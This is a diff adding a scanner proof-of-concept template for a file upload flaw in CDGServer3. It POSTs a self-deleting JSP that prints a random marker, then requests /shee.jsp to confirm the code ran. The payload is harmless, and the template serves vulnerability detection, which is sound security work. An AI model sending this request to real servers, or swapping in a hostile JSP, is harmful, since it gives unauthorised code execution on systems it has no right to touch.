@@ -1,0 +1,28 @@
+name: poc-yaml-cdgserver3-uploadfilefromclientserviceforclient-file-upload
+manual: true
+transport: http
+set:
+    s1: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /CDGServer3/UploadFileFromClientServiceForClient?a=AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGEFOFMFLBDFAGOGM
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: <% out.println("{{s1}}");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+            follow_redirects: false
+        expression: response.status == 200
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /shee.jsp
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(string(s1))
+expression: r0() && r1()
+detail:
+    author: xiaobaicai
+    links:
+        - https://www.ddpoc.com/poc/DVB-2023-4611.html#
